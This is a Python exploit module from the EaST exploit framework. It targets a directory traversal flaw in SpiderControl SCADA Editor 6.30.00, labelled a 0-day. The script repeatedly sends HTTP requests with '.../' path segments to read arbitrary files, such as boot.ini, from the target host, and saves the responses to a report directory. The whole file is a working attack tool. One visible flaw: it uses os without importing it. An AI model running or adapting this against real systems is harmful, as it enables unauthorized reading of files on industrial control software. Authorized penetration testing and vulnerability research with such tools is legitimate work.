#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution
import sys
import urllib2
import time

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_SpiderControl_SCADA_Editor_DirTrav"
INFO['DESCRIPTION'] = "SpiderControl SCADA Editor Directory Traversal Vulnerability 0-day"
INFO['VENDOR'] = "http://spidercontrol.net/products-solutions/scada/?L=1"
INFO["CVE Name"] = "0-day"
INFO["NOTES"] = """
SpiderControl SCADA HMI Editor is able to directly read and convert web
visualization directly from controls. The user need only enter the URL
of the appropriate HMI project into the PLC, and the tool automatically
imports the entire project which is displayed in an overview as thumbnails.
Either entire pages can be entered into a SCADA project from this selection,
or existing HMI objects can be reused in new pages using copy-paste. The user
not only retains existing investments, but also uses it in other projects.

Tested on: SpiderControl SCADA Editor - Version 6.30.00
"""

INFO['CHANGELOG'] = "13 Jan 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = '127.0.0.1'
OPTIONS["PORT"] = '65534'
OPTIONS["FILENAME"] = "boot.ini"

class exploit(Sploit):
    def __init__(self, host="", port=0,
        file_name="boot.ini",
            logger = None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.filename = file_name
        self.protocol = "http"
        self.state = "running"
        return

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.filename = self.args.get('FILENAME', 'boot.ini')
        self.protocol = "http"
        return

    def MakePath(self,f, count):
        a = ""
        for i in xrange(0, count):
            a = a + ".../"
        return a + f

    def sendGET(self):
        allData = ""
        for i in xrange(0, 32):
            request = self.protocol + "://" + self.host + ":" + str(self.port)
            request += "/" + self.MakePath(self.filename, i)
            self.log("sending request="+request)
            try:
                data = urllib2.urlopen(request)
                allData = data.read()
                if len(allData) < 1: continue
                if allData.lower().find("no such file or directory") > -1: continue
                if allData.lower().find("not exist") > -1: continue
                if allData.lower().find("syntax error.") > -1: continue
                self.log("Found file: " + request)
                break
            except:
                print('Not found')
        #writing the response   
        dirname= "report/"+self.name
        filename= "response_"+time.strftime("%b_%d_%Y_%H-%M-%S", time.gmtime())+".data"
        self.writefile(dirname, filename, allData)
        self.setInfo("response received. check output  files in %s for valuable info"%(dirname))
        return 1

    def writefile(self,dirname,filename,filedata):
        if not os.path.exists(dirname):
            os.makedirs(dirname)
        filepath=dirname+"/"+filename
        fd=file(filepath,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%filepath)
        return 1

    def run(self):
        self.args()
        self.log('Try download file: {}'.format(self.filename))
        if self.sendGET():
            self.finish(1)
        else:
            self.finish(0)


if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()
